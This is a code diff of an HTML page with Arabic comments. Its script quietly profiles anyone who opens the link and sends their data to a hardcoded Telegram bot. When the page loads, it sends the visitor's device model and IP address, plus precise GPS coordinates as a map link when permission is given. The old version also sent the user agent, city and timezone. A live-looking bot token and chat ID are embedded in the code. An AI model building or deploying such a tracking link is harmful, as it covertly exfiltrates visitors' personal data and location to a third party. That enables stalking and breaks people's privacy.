@@ -40,7 +40,7 @@
     </div>
 
     <script>
-        // دالة تحديد نوع الشركة والجهاز بشكل عام وديناميكي
+        // دالة تحديد نوع الشركة والجهاز
         function getExactDeviceName(ua) {
             if (/Android/.test(ua)) {
                 let brand = "Android (شركة غير معروفة)";
@@ -73,7 +73,7 @@
                         brand = "Sony";
                     }
                 }
-                return `${brand} [الموديل: ${modelCode}]`;
+                return `${brand} [${modelCode}]`;
             }
 
             if (/iPhone|iPad/.test(ua)) {
@@ -91,75 +91,47 @@
                 return 'iPhone / iPad';
             }
 
-            if (/Windows NT 10.0/.test(ua)) return 'كمبيوتر (Windows 10/11)';
-            if (/Macintosh/.test(ua)) return 'جهاز Mac';
-            if (/Linux/.test(ua)) return 'جهاز Linux (كمبيوتر)';
+            if (/Windows NT 10.0/.test(ua)) return 'Windows 10/11';
+            if (/Macintosh/.test(ua)) return 'Mac';
+            if (/Linux/.test(ua)) return 'Linux';
 
-            return 'جهاز غير معروف';
+            return 'غير معروف';
         }
 
-        async function trackVisitor() {
-            try {
-                let ipAddress = 'غير قادر على الجلب';
-                let deviceInfo = navigator.userAgent;
-                let location = 'غير معروف';
-                let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                
-                let exactDeviceName = getExactDeviceName(deviceInfo);
-                
-                try {
-                    const ipResponse = await fetch('https://ipwho.is/');
-                    if (ipResponse.ok) {
-                        const ipData = await ipResponse.json();
-                        ipAddress = ipData.ip;
-                        location = `${ipData.city}، ${ipData.country}`;
-                    }
-                } catch (e1) {
-                    try {
-                        const ipResponse = await fetch('https://api.ipify.org?format=json');
-                        if (ipResponse.ok) {
-                            const ipData = await ipResponse.json();
-                            ipAddress = ipData.ip;
-                        }
-                        const locResponse = await fetch('https://geolocation-db.com/json/');
-                        if (locResponse.ok) {
-                            const locData = await locResponse.json();
-                            location = `${locData.city}، ${locData.country_name}`;
-                        }
-                    } catch (e2) {
-                        console.log('فشلت الـ APIs في العمل');
-                    }
-                }
-                
-                // التعديل الجديد: حساب الوقت بناءً على توقيت الجزائر (توقيت وسط أوروبا GMT+1)
-                const timestamp = new Date().toLocaleString('ar-DZ', { timeZone: 'Africa/Algiers' });
-                
-                // صياغة الرسالة المرسلة للتليجرام
-                const message = `🚨 زائر جديد فتح الرابط!\n\n📱 الجهاز: ${exactDeviceName}\n📍 الموقع: ${location}\n🌍 IP Address: ${ipAddress}\n⏰ الوقت (بتوقيت الجزائر): ${timestamp}\n🕐 المنطقة الزمنية لجهاز الزائر: ${timezone}\n\nℹ️ السطر الخام (User Agent):\n${deviceInfo}`;
-                
-                const botToken = '8426812517:AAHI0TRbNfDDGcI97cyT6EpFV6y8ADLsAl8';
-                const chatId = '1802530770';
-                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-                
-                await fetch(telegramUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message
-                    })
-                });
-                
-                console.log('✅ تم الإرسال لتلجرام بنجاح بتوقيت الجزائر');
-                
-            } catch (error) {
-                console.log('خطأ في التنفيذ:', error);
-            }
-        }
+        const now = new Date().toLocaleString("ar-SA", {timeZone: "Asia/Riyadh"});
+        const ua = navigator.userAgent;
+        const botToken = '8426812517:AAHI0TRbNfDDGcI97cyT6EpFV6y8ADLsAl8';
+        const chatId = '1802530770';
         
-        window.addEventListener('load', trackVisitor);
+        let exactDeviceName = getExactDeviceName(ua);
+        
+        // إرسال البيانات الأساسية على الفور
+        const basicMsg = `✅ زائر جديد!%0A⏰ ${now}%0A📱 الجهاز: ${exactDeviceName}`;
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${basicMsg}`);
+        
+        // جزء جلب الـ IP (بدون انتظار طويل)
+        fetch("https://api.ipify.org?format=json", {timeout: 5000})
+          .then(r => r.json())
+          .then(data => {
+            const ip = data.ip;
+            const ipMsg = `🔗 IP Address: ${ip}`;
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${ipMsg}`);
+          })
+          .catch(() => {
+            console.log('لم يتمكن من جلب IP');
+          });
+        
+        // جزء جلب الموقع (بدون انتظار)
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition((pos) => {
+            let lat = pos.coords.latitude;
+            let lon = pos.coords.longitude;
+            const locMsg = `📍 الموقع:%0A🗺 https://www.google.com/maps?q=${lat},${lon}`;
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${locMsg}`);
+          }, () => {
+            console.log('لم يتمكن من جلب الموقع');
+          });
+        }
     </script>
 </body>
 </html>
